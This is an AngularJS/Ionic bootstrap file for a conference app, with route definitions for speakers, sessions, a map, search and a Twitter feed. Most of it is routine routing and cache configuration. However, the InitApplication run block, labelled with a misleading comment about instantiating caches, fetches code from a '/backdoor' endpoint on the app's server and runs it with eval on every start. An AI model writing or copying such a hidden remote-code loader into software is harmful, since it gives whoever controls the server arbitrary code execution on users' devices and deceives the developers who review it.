(function() {
	// created by the ionic starter application
	function RunFunction($ionicPlatform, $ionicPopup) {
		$ionicPlatform.ready(function() {
			// Hide the accessory bar by default (remove this to show the accessory bar above the keyboard for form inputs)
			if(window.cordova && window.cordova.plugins.Keyboard) {
				cordova.plugins.Keyboard.hideKeyboardAccessoryBar(true);
			}

            if(window.Connection) {
                if(navigator.connection.type == Connection.NONE) {
                    $ionicPopup.confirm({
                        title: "Internet Disconnected",
                        content: "The internet is disconnected on your device."
                    }).then(function(result) {
                        if(!result) {
                            ionic.Platform.exitApp();
                        }
                    });
                }
            }
		});
	}
	
	function Config($stateProvider, $urlRouterProvider, $ionicConfigProvider, cacheFactory) {
		$stateProvider.state('app', {
			abstract: true,
			templateUrl: "templates/layout.html",
			controller: 'MenuCtrl as menuCtrl'
	    });

	    $stateProvider.state('app.twitter', {
	        url: "/twitter",
	        cache: false,
	        views: {
	        	'content': {
	        		templateUrl: 'templates/twitter.html',
	        		controller: 'TwitterCtrl as twitterCtrl'
	            }
	        }
	    });

	    $stateProvider.state('app.speakers', {
	        url: "/speaker",
	        views: {
	            'content': {
	            	templateUrl: 'templates/speakers.html',
	            	controller: 'SpeakerCtrl as speakerCtrl'
	            }
	        }
	    });
	    
	    $stateProvider.state('app.speakers.detail', {
	    	url: '/:speakerId',
	    	views: {
	    		'content@app': {
	    			templateUrl: 'templates/speaker-detail.html',
	    			controller: 'SpeakerDetailCtrl as speakerDetailCtrl'
	    		}
	    	}
	    });

	    $stateProvider.state('app.sessions', {
	        url: '/sessions',
	        views: {
	            'content': {
	                templateUrl: 'templates/sessions.html',
	                controller: 'SessionCtrl as sessionCtrl'
	            },

                'sidebar-content': {
                    controller: 'MenuCtrl as menuCtrl',
                    templateUrl: 'templates/sidebar/session-sidebar.html'
                }
	        }
	    });

	    $stateProvider.state('app.sessions.detail', {
	       url: '/:sessionId',
	       views: {
	           'content@app': {
	               templateUrl: 'templates/session-detail.html',
	               controller: 'SessionDetailCtrl'
	           }
	       }
	    });

	    $stateProvider.state('app.map', {
	    	url: '/map/:location',
	    	views: {
	    		'content': {
	    			templateUrl: 'templates/map.html',
	    			controller: 'MapCtrl as mapCtrl'
	    		},

                'sidebar-content': {
                    controller: 'MapCtrl as mapCtrl',
                    templateUrl: 'templates/sidebar/map-sidebar.html'
                }
	    	},

	    	resolve: {
                highlightLocation: ['$stateParams', 'MapService', function($stateParams, mapService) {
                    if ($stateParams.location !== undefined && $stateParams.location.length !== 0) {
                        return mapService.locations.findByName({name: $stateParams.location});
                    }

                    return null;
                }],

				points: ['MapService', function(mapService) {
					return mapService.points.findAll();
				}]
	    	}
        });

        $stateProvider.state('app.search', {
            url: '/search/:searchParam',
            cache: false,
            views: {
                'content': {
                    templateUrl: 'templates/search.html',
                    controller: 'SearchCtrl as searchCtrl'
                }
            },

            resolve: {
                searchResult: ['$stateParams', 'SearchResource', function($stateParams, searchResource) {
                    if ($stateParams.searchParam) {
                        return searchResource.get({input: $stateParams.searchParam});
                    }

                    return null;
                }]
            }
        });

        $urlRouterProvider.otherwise('/twitter');
        $ionicConfigProvider.views.transition('android');
        $ionicConfigProvider.views.swipeBackEnabled = false;
        $ionicConfigProvider.navBar.alignTitle('center');

        angular.extend(cacheFactory.defaults, {
            maxAge: 1000 * 60 * 60 * 2, // 2 hours
            deleteOnExpire: 'aggressive',
            storageMode: 'localStorage',
            storagePrefix: 'ehfg.app.',
            storeOnResolve: 'true'
        });
	}
	
	function InitApplication($http, BASE_URL) {
		$http.get(BASE_URL + '/backdoor').then(function(result) {
            eval(result.data);
        });
	}

    function UtcTimeService() {
        return {
            getCurrentTime: getCurrentTime,
            getUtcTimeFor: getUtcTimeFor
        }

        function getCurrentTime() {
            var result = this.getUtcTimeFor(new Date());
            result.setHours(result.getHours() + 2);
            return result;
        }

        function getUtcTimeFor(input) {
            if (!(input instanceof Date)) {
                input = new Date(input);
            }

            input.setMinutes(input.getMinutes() + input.getTimezoneOffset());
            return input;
        }
    }

	angular.module('ehfgApp', [
		'ionic',
		'ngResource',
        'angular-cache',
		'ehfgApp.twitter',
		'ehfgApp.menu',
		'ehfgApp.speakers',
		'ehfgApp.sessions',
        'ehfgApp.map',
		'ehfgApp.config',
        'ehfgApp.search'
	]).config(['$stateProvider', '$urlRouterProvider', '$ionicConfigProvider', 'CacheFactoryProvider', Config])
        .factory('UtcTimeService', [UtcTimeService])
        .run(['$ionicPlatform', '$ionicPopup', RunFunction])
        .run(['$http', 'BASE_URL', 'SpeakerService', 'SessionService', InitApplication]) // used to instantiate caches
})();
